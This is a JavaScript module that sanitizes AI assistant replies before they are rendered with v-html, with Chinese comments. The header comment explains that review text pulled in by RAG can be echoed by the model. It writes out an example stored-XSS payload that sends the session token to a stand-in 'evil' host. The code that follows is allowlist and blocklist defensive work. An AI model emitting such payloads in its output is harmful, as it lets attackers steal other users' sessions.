/**
 * HTML 净化（白名单）
 *
 * 为什么需要：
 *   AI 助手的回复用 v-html 渲染（因为后端返回的是 <br>、<b> 这类富文本片段）。
 *   而 AI 的 RAG 会把数据库里的"用户评价原文"拼进 prompt。若某个用户提交的
 *   评价内容是 <img src=x onerror="fetch('//evil?t='+sessionStorage.token)">，
 *   模型很可能原样带回，直接 v-html 就会在别人浏览器里执行 —— 存储型 XSS，
 *   而 token 正好存在 sessionStorage 里。
 *
 * 做法：
 *   用 DOMParser 的独立文档解析（惰性解析，不执行脚本、不发请求），
 *   按白名单重建：只保留排版类标签和属性，剥掉所有 on* 事件、
 *   javascript: 协议、危险标签与危险 CSS。
 */

// 允许保留的标签（覆盖后端预设回答用到的 <br>/<b>/<span style> 以及常见的排版标签）
const ALLOWED_TAGS = new Set([
  'B', 'STRONG', 'I', 'EM', 'U', 'S', 'BR', 'P', 'DIV', 'SPAN',
  'UL', 'OL', 'LI', 'H1', 'H2', 'H3', 'H4', 'H5', 'H6',
  'TABLE', 'THEAD', 'TBODY', 'TR', 'TH', 'TD',
  'CODE', 'PRE', 'BLOCKQUOTE', 'HR', 'A', 'IMG'
])

// 允许保留的属性
const ALLOWED_ATTRS = new Set(['style', 'href', 'src', 'alt', 'title', 'target', 'rel', 'class'])

// 整体丢弃（连同内容一起删）
const DROP_TAGS = new Set([
  'SCRIPT', 'STYLE', 'IFRAME', 'FRAME', 'FRAMESET', 'OBJECT', 'EMBED',
  'FORM', 'INPUT', 'BUTTON', 'TEXTAREA', 'SELECT', 'OPTION', 'LINK', 'META',
  'SVG', 'MATH', 'BASE', 'APPLET', 'AUDIO', 'VIDEO', 'SOURCE'
])

/** 清理单个元素的属性 */
function cleanAttrs(el) {
  Array.from(el.attributes).forEach(attr => {
    const name = attr.name.toLowerCase()
    const value = attr.value || ''

    // 1. 一律干掉事件属性（onclick / onerror / onload ...）
    if (name.startsWith('on')) {
      el.removeAttribute(attr.name)
      return
    }
    // 2. 不在白名单内的属性直接删
    if (!ALLOWED_ATTRS.has(name)) {
      el.removeAttribute(attr.name)
      return
    }
    // 3. 链接与图片地址只允许安全协议
    if (name === 'href' || name === 'src') {
      const v = value.trim().toLowerCase()
      const safe = v.startsWith('http://') || v.startsWith('https://') ||
                   v.startsWith('/') || v.startsWith('#') ||
                   (name === 'src' && v.startsWith('data:image/'))
      if (!safe) el.removeAttribute(attr.name)
      return
    }
    // 4. CSS 里可能藏执行或外链，含这些关键字就整条丢弃
    if (name === 'style') {
      const v = value.toLowerCase()
      if (v.includes('expression') || v.includes('javascript:') ||
          v.includes('url(') || v.includes('@import') || v.includes('behavior')) {
        el.removeAttribute(attr.name)
      }
      return
    }
    // 5. 新窗口打开时补 rel，避免 window.opener 被反向控制
    if (name === 'target' && value.toLowerCase() === '_blank') {
      el.setAttribute('rel', 'noopener noreferrer')
    }
  })
}

/**
 * 净化 HTML 字符串，返回可安全交给 v-html 的内容
 * @param {string} html 原始 HTML
 * @returns {string} 净化后的 HTML
 */
export function sanitizeHtml(html) {
  if (html === null || html === undefined) return ''
  const text = String(html)
  if (!text) return ''

  // createHTMLDocument 不会执行脚本，也不会加载 src，比直接 innerHTML 到页面安全
  const doc = document.implementation.createHTMLDocument('')
  const container = doc.createElement('div')
  container.innerHTML = text

  // querySelectorAll 返回静态列表，元素对象在"解包"后仍有效
  const all = container.querySelectorAll('*')
  for (let i = 0; i < all.length; i++) {
    const el = all[i]
    if (!el.parentNode) continue // 已被前面的步骤删掉

    const tag = el.tagName.toUpperCase()

    if (DROP_TAGS.has(tag)) {
      el.remove()
      continue
    }

    if (!ALLOWED_TAGS.has(tag)) {
      // 未知标签（如 <font>、<marquee>）：拆掉外壳，把文字内容留下
      const parent = el.parentNode
      while (el.firstChild) parent.insertBefore(el.firstChild, el)
      parent.removeChild(el)
      continue
    }

    cleanAttrs(el)
  }

  return container.innerHTML
}

export default sanitizeHtml
